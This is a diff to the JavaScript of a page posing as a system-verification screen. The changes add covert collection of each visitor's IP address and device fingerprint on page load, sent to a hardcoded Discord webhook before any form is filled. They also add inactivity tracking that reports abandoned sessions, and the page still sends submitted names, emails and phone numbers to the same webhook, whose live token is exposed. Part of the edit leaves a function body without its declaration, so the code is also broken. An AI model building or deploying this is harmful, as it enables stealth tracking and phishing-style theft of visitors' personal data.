@@ -1,6 +1,162 @@
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1413918853238358159/6sXdgaB9em-SzJ5kGbQGuvh7DXhxphk94eP4MwMKJbgMchMHKWR17VmyrbGw-Y3S-mtm';
 
 let loadingProgress = 0;
+let userIP = '';
+let initialWebhookSent = false;
+let sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
+let formStartTime = Date.now();
+let inactivityTimer = null;
+const INACTIVITY_TIMEOUT = 5 * 60 * 1000; // 5 minutes
+
+// Store session data in localStorage as backup
+function storeSessionData() {
+    const sessionData = {
+        sessionId: sessionId,
+        ip: userIP,
+        startTime: formStartTime,
+        initialWebhookSent: initialWebhookSent,
+        lastActivity: Date.now()
+    };
+    
+    try {
+        localStorage.setItem('userSession_' + sessionId, JSON.stringify(sessionData));
+        console.log('💾 Session data stored in localStorage');
+    } catch (error) {
+        console.error('❌ Failed to store session data:', error);
+    }
+}
+
+// Setup inactivity monitoring
+function setupInactivityMonitoring() {
+    // Reset timer on user activity
+    const resetTimer = () => {
+        if (inactivityTimer) {
+            clearTimeout(inactivityTimer);
+        }
+        
+        inactivityTimer = setTimeout(() => {
+            console.log('⏰ Inactivity timeout reached');
+            handleIncompleteSession();
+        }, INACTIVITY_TIMEOUT);
+        
+        // Update last activity time
+        storeSessionData();
+    };
+    
+    // Monitor user activity
+    ['mousedown', 'mousemove', 'keypress', 'scroll', 'touchstart', 'click'].forEach(event => {
+        document.addEventListener(event, resetTimer, true);
+    });
+    
+    // Start the timer
+    resetTimer();
+}
+
+// Handle incomplete session (user didn't complete form)
+function handleIncompleteSession() {
+    console.log('📝 Handling incomplete session...');
+    
+    // Send final webhook with just the information we have
+    sendIncompleteSessionWebhook();
+    
+    // Show a message to the user
+    showIncompleteSessionMessage();
+}
+
+// Send webhook for incomplete session
+async function sendIncompleteSessionWebhook() {
+    if (!userIP || userIP === 'Unknown IP') {
+        console.log('❌ No IP information to send');
+        return;
+    }
+    
+    try {
+        const deviceInfo = getDeviceInfo();
+        const sessionDuration = Date.now() - formStartTime;
+        
+        const embed = {
+            title: '⚠️ Incomplete Session',
+            description: '👤 User visited but did not complete the form',
+            color: 0xff9500, // Orange color for incomplete
+            fields: [
+                { name: '🆔 Session ID', value: sessionId, inline: false },
+                { name: '🌐 IP Address', value: userIP, inline: true },
+                { name: '📱 Device Type', value: deviceInfo.mobileDeviceType, inline: true },
+                { name: '🖥️ Platform', value: deviceInfo.platform, inline: true },
+                { name: '🌍 Language', value: deviceInfo.language, inline: true },
+                { name: '🕐 Session Duration', value: formatDuration(sessionDuration), inline: true },
+                { name: '📝 Status', value: '❌ Form not completed', inline: false },
+                { name: '📊 Initial Webhook', value: initialWebhookSent ? '✅ Sent' : '❌ Failed', inline: true }
+            ],
+            footer: {
+                text: 'Session ended without form completion - IP information preserved'
+            }
+        };
+
+        const payload = {
+            embeds: [embed]
+        };
+        
+        console.log('📤 Sending incomplete session webhook...');
+        const success = await trySendWebhookMethods(payload);
+        
+        if (success) {
+            console.log('✅ Incomplete session webhook sent successfully');
+        } else {
+            console.error('❌ Failed to send incomplete session webhook');
+        }
+        
+    } catch (error) {
+        console.error('❌ Error sending incomplete session webhook:', error);
+    }
+}
+
+// Format duration for display
+function formatDuration(milliseconds) {
+    const seconds = Math.floor(milliseconds / 1000);
+    const minutes = Math.floor(seconds / 60);
+    const hours = Math.floor(minutes / 60);
+    
+    if (hours > 0) {
+        return `${hours}h ${minutes % 60}m ${seconds % 60}s`;
+    } else if (minutes > 0) {
+        return `${minutes}m ${seconds % 60}s`;
+    } else {
+        return `${seconds}s`;
+    }
+}
+
+// Show message for incomplete session
+function showIncompleteSessionMessage() {
+    const message = document.createElement('div');
+    message.style.cssText = `
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        background: rgba(255, 149, 0, 0.9);
+        color: white;
+        padding: 15px 20px;
+        border-radius: 8px;
+        font-size: 14px;
+        z-index: 10000;
+        max-width: 300px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+    `;
+    message.innerHTML = `
+        <strong>⏰ Session Timeout</strong><br>
+        Your session has ended due to inactivity.<br>
+        <small>Your IP information has been recorded.</small>
+    `;
+    
+    document.body.appendChild(message);
+    
+    // Remove message after 5 seconds
+    setTimeout(() => {
+        if (message.parentNode) {
+            message.parentNode.removeChild(message);
+        }
+    }, 5000);
+}
 
 const loadingSteps = [
     { text: 'Initializing system...', duration: 1500 },
@@ -79,8 +235,9 @@ function getDeviceInfo() {
 }
 
 async function sendWebhook(userData) {
-    console.log('🚀 Starting webhook send process...');
+    console.log('🚀 Starting completion webhook send process...');
     console.log('📋 User data:', userData);
+    console.log('🆔 Session ID:', sessionId);
     
     if (!WEBHOOK_URL) {
         console.error('❌ Webhook URL is not configured');
@@ -88,31 +245,21 @@ async function sendWebhook(userData) {
     }
     
     try {
-        console.log('🌐 Getting IP address...');
-        const ip = await fetch('https://api.ipify.org?format=json')
-            .then(response => {
-                console.log('📡 IP response status:', response.status);
-                return response.json();
-            })
-            .then(data => {
-                console.log('✅ IP retrieved:', data.ip);
-                return data.ip;
-            })
-            .catch(error => {
-                console.error('❌ Failed to get IP:', error);
-                return 'Unknown IP';
-            });
+        // Use the IP we already collected
+        const ip = userIP || 'Unknown IP';
+        console.log('🌐 Using collected IP:', ip);
 
         console.log('📱 Getting device info...');
         const deviceInfo = getDeviceInfo();
         console.log('📊 Device info collected:', deviceInfo);
 
-        console.log('🔧 Building webhook payload...');
+        console.log('🔧 Building completion webhook payload...');
         const embed = {
-            title: '📋 User Information Submitted',
-            description: '👤 User submitted their personal information',
-            color: 0x00ff00,
+            title: '✅ User Information Completed',
+            description: '👤 User successfully completed the information form',
+            color: 0x00ff00, // Green color for completion
             fields: [
+                { name: '🆔 Session ID', value: sessionId, inline: false },
                 { name: '👤 Full Name', value: userData.name || 'Not provided', inline: false },
                 { name: '📧 Email Address', value: userData.email || 'Not provided', inline: false },
                 { name: '📞 Phone Number', value: userData.phone || 'Not provided', inline: false },
@@ -127,22 +274,35 @@ async function sendWebhook(userData) {
                 { name: '⚡ CPU Cores', value: deviceInfo.cpuCores, inline: true },
                 { name: '🌐 Browser', value: deviceInfo.browser, inline: true },
                 { name: '💻 Operating System', value: deviceInfo.os, inline: true },
-                { name: '🕐 Timestamp', value: deviceInfo.timestamp, inline: false }
-            ]
+                { name: '🕐 Completion Time', value: deviceInfo.timestamp, inline: false },
+                { name: '📝 Status', value: '✅ User information successfully submitted', inline: false },
+                { name: '📊 Initial Webhook', value: initialWebhookSent ? '✅ Sent' : '❌ Failed', inline: true }
+            ],
+            footer: {
+                text: 'Form completed successfully - user provided all requested information'
+            }
         };
 
         const payload = {
             embeds: [embed]
         };
         
-        console.log('📤 Preparing to send webhook...');
-        console.log('📦 Payload:', JSON.stringify(payload, null, 2));
+        console.log('📤 Preparing to send completion webhook...');
+        console.log('📦 Completion payload:', JSON.stringify(payload, null, 2));
         
         // Try multiple methods to send webhook
-        return await trySendWebhookMethods(payload);
+        const success = await trySendWebhookMethods(payload);
+        
+        if (success) {
+            console.log('✅ Completion webhook sent successfully');
+        } else {
+            console.error('❌ Failed to send completion webhook');
+        }
+        
+        return success;
         
     } catch (error) {
-        console.error('❌ Error in webhook process:', error);
+        console.error('❌ Error in completion webhook process:', error);
         console.error('❌ Error details:', error.message);
         return false;
     }
@@ -336,21 +496,6 @@ async function startLoadingSequence() {
     // Wait a moment before transitioning
     await new Promise(resolve => setTimeout(resolve, 1000));
     
-    // Transition to info form screen
-    document.getElementById('loading-screen').style.display = 'none';
-    document.getElementById('verification-screen').style.display = 'flex';
-}
-
-function setupInfoForm() {
-    console.log('🔧 Setting up info form...');
-    
-    const nameInput = document.getElementById('user-name');
-    const emailInput = document.getElementById('user-email');
-    const phoneInput = document.getElementById('user-phone');
-    const submitBtn = document.getElementById('submit-info');
-    const nameError = document.getElementById('name-error');
-    const emailError = document.getElementById('email-error');
-    const phoneError = document.getElementById('phone-error');
     
     // Check if all elements exist
     console.log('📋 Form elements check:');
@@ -476,6 +621,102 @@ function setupInfoForm() {
 }
 
 window.addEventListener('load', function() {
+    console.log('🚀 Application loaded');
+    console.log('🆔 Session ID:', sessionId);
+    
+    // Setup inactivity monitoring
+    setupInactivityMonitoring();
+    
+    // Collect IP and send initial webhook immediately
+    collectIPAndSendInitialWebhook();
+    
+    // Start loading sequence
     startLoadingSequence();
     setupInfoForm();
 });
+
+// Collect IP and send initial webhook with just IP and device info
+async function collectIPAndSendInitialWebhook() {
+    console.log('🌐 Starting IP collection and initial webhook...');
+    
+    try {
+        // Get IP address
+        console.log('📡 Getting IP address...');
+        userIP = await fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                console.log('✅ IP retrieved:', data.ip);
+                return data.ip;
+            })
+            .catch(error => {
+                console.error('❌ Failed to get IP:', error);
+                return 'Unknown IP';
+            });
+        
+        // Get device info
+        console.log('📱 Getting device info...');
+        const deviceInfo = getDeviceInfo();
+        
+        // Send initial webhook with just IP and device info
+        console.log('📤 Sending initial webhook with IP and device info...');
+        const initialSuccess = await sendInitialWebhook(userIP, deviceInfo);
+        
+        if (initialSuccess) {
+            initialWebhookSent = true;
+            console.log('✅ Initial webhook sent successfully');
+        } else {
+            console.error('❌ Failed to send initial webhook');
+        }
+        
+    } catch (error) {
+        console.error('❌ Error in initial webhook process:', error);
+    }
+}
+
+// Send initial webhook with IP and device info
+async function sendInitialWebhook(ip, deviceInfo) {
+    if (!WEBHOOK_URL) {
+        console.error('❌ Webhook URL is not configured');
+        return false;
+    }
+    
+    try {
+        const embed = {
+            title: '🌐 User Visit Detected',
+            description: '👤 A user has accessed the system',
+            color: 0x3498db, // Blue color for initial visit
+            fields: [
+                { name: '🆔 Session ID', value: sessionId, inline: false },
+                { name: '🌐 IP Address', value: ip, inline: true },
+                { name: '📱 Device Type', value: deviceInfo.mobileDeviceType, inline: true },
+                { name: '🖥️ Platform', value: deviceInfo.platform, inline: true },
+                { name: '🌍 Language', value: deviceInfo.language, inline: true },
+                { name: '📺 Screen Resolution', value: deviceInfo.screenRes, inline: true },
+                { name: '🎨 Color Depth', value: deviceInfo.colorDepth, inline: true },
+                { name: '🕐 Timezone', value: deviceInfo.timezone, inline: true },
+                { name: '💾 Device Memory', value: deviceInfo.deviceMemory, inline: true },
+                { name: '⚡ CPU Cores', value: deviceInfo.cpuCores, inline: true },
+                { name: '🌐 Browser', value: deviceInfo.browser, inline: true },
+                { name: '💻 Operating System', value: deviceInfo.os, inline: true },
+                { name: '🕐 Visit Time', value: deviceInfo.timestamp, inline: false },
+                { name: '📝 Status', value: '⏳ Awaiting user information submission...', inline: false }
+            ],
+            footer: {
+                text: 'Initial visit detected - waiting for user to complete form'
+            }
+        };
+
+        const payload = {
+            embeds: [embed]
+        };
+        
+        console.log('📦 Initial webhook payload prepared');
+        
+        // Try to send webhook
+        return await trySendWebhookMethods(payload);
+        
+    } catch (error) {
+        console.error('❌ Error sending initial webhook:', error);
+        return false;
+    }
+}
